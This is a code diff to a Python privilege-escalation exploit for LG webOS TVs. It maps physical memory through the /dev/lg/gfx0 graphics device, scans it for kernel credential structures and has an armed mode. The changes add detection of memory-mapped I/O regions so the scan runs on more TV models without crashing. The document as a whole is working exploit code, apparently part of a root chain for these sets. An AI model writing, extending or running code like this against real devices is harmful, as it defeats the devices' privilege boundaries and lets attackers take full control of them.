@@ -1,9 +1,14 @@
 # -*- coding: utf-8 -*-
 # ============================================================================
-#  GFX-only privilege escalation for LG webOS TVs (LG CX family).
+#  GFX-only privilege escalation for LG webOS TVs.
 #  AUTHOR: James McVay. This exploit (gfx_cred_escalate.py) is HIS work.
 #  Published here with full credit; the permanent-root chain around it
 #  (shim + init chain + daemon + NZ Store) is by Natxo (2026-10).
+#
+#  DYNAMIC MMIO SKIP: auto-detects non-RAM regions so the scan is safe on
+#  any SoC (CX, NANO95/E60, and others). Uses /proc/iomem when addresses
+#  are available (root), otherwise probes one page per chunk boundary via
+#  GFX to discover unreadable regions before the full scan.
 # ============================================================================
 # GFX-only privilege escalation, self-calibrating and confined to physical
 # addresses at or above the GFX BASE floor. No kernel image, no per-model
@@ -74,6 +79,7 @@ GFX = "/dev/lg/gfx0"
 CHUNK = 16 * 1024 * 1024
 OVERLAP = 0x1000
 SCAN_TOTAL_TIMEOUT = 180
+SKIP_RANGES = []
 
 libc = ctypes.CDLL("libc.so.6", use_errno=True)
 libc.syscall.restype = ctypes.c_void_p
@@ -103,6 +109,9 @@ def gfx_map(phys, length, prot):
     if (length <= 0 or not P.base or not P.ram_top or
             phys < P.base or phys + length > P.ram_top):
         return (None, 0, -1)
+    for skip_lo, skip_hi in SKIP_RANGES:
+        if phys < skip_hi and phys + length > skip_lo:
+            return (None, 0, -1)
     base = phys & ~0xfff
     span = ((phys + length - base + 0xfff) & ~0xfff) or 0x1000
     pgoff = (base - P.base) >> 12
@@ -208,6 +217,132 @@ def parse_mem_stat():
     except Exception:
         return None, None
 
+def _probe_chunk(phys):
+    """Fork a child that tries to read one page at phys via GFX.
+    Returns True if readable, False if SIGBUS/fail."""
+    r, w = os.pipe()
+    pid = os.fork()
+    if pid == 0:
+        os.close(r)
+        libc.prctl(PR_SET_NAME, b"gfxprobe", 0, 0, 0)
+        a, span, fd = gfx_map(phys, 0x1000, PROT_READ)
+        if a is None:
+            os._exit(1)
+        try:
+            ctypes.string_at(a, 64)
+        except Exception:
+            os._exit(2)
+        libc.munmap(ctypes.c_void_p(a), span)
+        os.close(fd)
+        os._exit(0)
+    os.close(w)
+    try:
+        _, status = read_child_output(pid, r, 64, 5)
+    except RuntimeError:
+        try:
+            os.kill(pid, signal.SIGKILL)
+            os.waitpid(pid, 0)
+        except Exception:
+            pass
+        return False
+    if os.WIFEXITED(status) and os.WEXITSTATUS(status) == 0:
+        return True
+    return False
+
+def _probe_skip_ranges(scan_lo, scan_hi):
+    """Build skip ranges by probing one page per CHUNK boundary."""
+    log("iomem: probing %d chunk boundaries for MMIO regions..." %
+        (((scan_hi - scan_lo) + CHUNK - 1) // CHUNK))
+    skips = []
+    skip_start = None
+    off = scan_lo
+    while off < scan_hi:
+        ok = _probe_chunk(off)
+        if not ok:
+            if skip_start is None:
+                skip_start = off
+        else:
+            if skip_start is not None:
+                skips.append((skip_start, off))
+                skip_start = None
+        off += CHUNK
+    if skip_start is not None:
+        skips.append((skip_start, scan_hi))
+    return skips
+
+def detect_mmio_skip_ranges(scan_lo, scan_hi):
+    """Build SKIP_RANGES from /proc/iomem, with probe-based fallback.
+
+    Parses /proc/iomem to find all top-level regions in [scan_lo, scan_hi)
+    that are NOT "System RAM". On kernels that zero addresses for non-root
+    (common on webOS), falls back to probing one page per chunk boundary
+    via the GFX device to discover unreadable regions before the full scan.
+    """
+    try:
+        lines = open("/proc/iomem").readlines()
+    except Exception:
+        log("iomem: cannot read /proc/iomem, falling back to probe")
+        return _probe_skip_ranges(scan_lo, scan_hi)
+
+    # Check whether addresses are zeroed (non-root on most kernels)
+    addrs_zeroed = True
+    ram_regions = []
+    for line in lines:
+        if line[0] in (' ', '\t'):
+            continue
+        m = re.match(r'\s*([0-9a-fA-F]+)-([0-9a-fA-F]+)\s*:\s*(.*)', line)
+        if not m:
+            continue
+        lo = int(m.group(1), 16)
+        hi = int(m.group(2), 16) + 1
+        label = m.group(3).strip()
+        if lo != 0 or hi != 1:
+            addrs_zeroed = False
+        if lo >= scan_hi or hi <= scan_lo:
+            continue
+        ram_regions.append((lo, hi, label))
+
+    if addrs_zeroed:
+        log("iomem: addresses zeroed (non-root), falling back to probe")
+        return _probe_skip_ranges(scan_lo, scan_hi)
+
+    if not ram_regions:
+        log("iomem: no regions overlap scan range, no MMIO skip")
+        return []
+
+    ram_set = []
+    for lo, hi, label in ram_regions:
+        if "System RAM" in label:
+            ram_set.append((max(lo, scan_lo), min(hi, scan_hi)))
+
+    ram_set.sort()
+    merged_ram = []
+    for lo, hi in ram_set:
+        if merged_ram and lo <= merged_ram[-1][1]:
+            merged_ram[-1] = (merged_ram[-1][0], max(merged_ram[-1][1], hi))
+        else:
+            merged_ram.append((lo, hi))
+
+    skips = []
+    cursor = scan_lo
+    for rlo, rhi in merged_ram:
+        if rlo > cursor:
+            skips.append((cursor, rlo))
+        cursor = max(cursor, rhi)
+    if cursor < scan_hi:
+        skips.append((cursor, scan_hi))
+
+    if skips:
+        total_skip = sum(hi - lo for lo, hi in skips)
+        log("iomem: detected %d MMIO skip region(s), %.1f MB total:" %
+            (len(skips), total_skip / (1024.0 * 1024.0)))
+        for lo, hi in skips:
+            log("  skip 0x%x-0x%x (%.1f MB)" % (lo, hi, (hi - lo) / (1024.0 * 1024.0)))
+    else:
+        log("iomem: scan range is all System RAM, no MMIO skip needed")
+
+    return skips
+
 def read_cap_mask():
     try:
         with open("/proc/sys/kernel/cap_last_cap") as source:
@@ -265,6 +400,15 @@ def scan_needle(needle, lo, hi, want_before=0):
     while off < hi:
         if time.time() >= until:
             raise RuntimeError("physical-memory scan exceeded total deadline; stop")
+        in_skip = False
+        for skip_lo, skip_hi in SKIP_RANGES:
+            if off >= skip_lo and off < skip_hi:
+                log("scan: skipping dangerous range 0x%x (-> 0x%x)" % (off, skip_hi))
+                off = skip_hi
+                in_skip = True
+                break
+        if in_skip:
+            continue
         length = min(CHUNK + OVERLAP, hi - off)
         r, w = os.pipe(); pid = os.fork()
         if pid == 0:
@@ -290,12 +434,13 @@ def scan_needle(needle, lo, hi, want_before=0):
                                              min(30, until - time.time()))
         except RuntimeError as e:
             raise RuntimeError("physical-memory scan at 0x%x: %s" % (off, e))
-        if os.WIFSIGNALED(status) and os.WTERMSIG(status) == signal.SIGBUS:
-            # A reported zone can span an absent physical range. Discard this
-            # child's entire output and keep searching other chunks; no hit
-            # from a partially read chunk can enter calibration.
+        if (os.WIFSIGNALED(status) and os.WTERMSIG(status) == signal.SIGBUS) or \
+           (os.WIFEXITED(status) and os.WEXITSTATUS(status) in (1, 2)):
             skipped += 1
-            log("scan: skipping SIGBUS chunk at 0x%x" % off)
+            if os.WIFSIGNALED(status):
+                log("scan: skipping SIGBUS chunk at 0x%x" % off)
+            else:
+                log("scan: skipping failed chunk at 0x%x (exit %d)" % (off, os.WEXITSTATUS(status)))
             if skipped * CHUNK > (hi - lo) // 2:
                 raise RuntimeError("physical-memory scan skipped over half its range; stop")
             off += CHUNK
@@ -696,6 +841,8 @@ def main():
         log("could not read BASE from procfs; aborting"); return 1
     P.ram_top = find_ram_top(P.carveout_end)
     P.cap_full = read_cap_mask()
+    global SKIP_RANGES
+    SKIP_RANGES = detect_mmio_skip_ranges(P.carveout_end, P.ram_top)
     log("BASE=0x%x  carveout_end=0x%x  ram_top=0x%x  uid=%d gid=%d  mode=%s"
         % (P.base, P.carveout_end, P.ram_top, P.myuid, P.mygid, "ARMED" if go else "DRY-RUN"))
     if gfx_read(P.carveout_end, 16) is None:
